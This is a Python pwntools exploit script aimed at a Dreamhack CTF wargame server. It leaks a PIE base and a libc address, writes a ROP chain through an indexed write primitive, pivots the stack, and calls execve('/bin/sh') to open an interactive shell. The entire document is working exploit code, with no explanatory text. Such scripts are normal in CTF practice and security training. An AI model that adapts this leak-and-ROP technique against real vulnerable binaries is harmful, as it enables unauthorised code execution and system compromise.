from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 22524

def read_string(data):
    r.sendline(b'1')
    r.send(data)

def write(idx, data):
    r.sendline(b'2')
    r.sendline(str(idx).encode())
    r.sendline(str(data).encode())

def third(idx):
    r.sendline(b'3')
    r.sendline(str(idx).encode())

def reset():
    r.sendline(b'0')

pie = 0
while 1:
    r = remote(HOST, PORT)
    try:
        read_string(b'A'*0x50)
        third(1)
        r.recvline()
        pie = int(r.recvline().decode().strip())-0x1480
        if pie & 0xfff == 0:
            break
    except:
        r.close()

pop_rdi = pie + 0x14e3
pop_rsi_r15 = pie + 0x14e1
puts_plt = pie + 0x10c0
puts_got = pie + 0x3fa8
scanf_plt = pie + 0x1110
bss = pie + 0x4120
format = pie + 0x2009
ret = pie + 0x101a
leave = pie + 0x13fd

payload = [
    bss,
    pop_rdi, puts_got,
    puts_plt,
    pop_rdi, format,
    pop_rsi_r15, bss, 0,
    ret,
    scanf_plt,
    leave
]

for i in range(len(payload)):
    write(i+2, payload[i])

reset()
libc = u64(r.recvline().strip().ljust(8,b'\x00')) - 0x84450
system = libc + 0x522c0
execve = libc + 0xe31a0
binsh = libc + 0x1b45bd

payload = flat([
    0,
    pop_rdi, binsh,
    pop_rsi_r15, 0, 0,
    execve
])
r.sendline(payload)

r.interactive()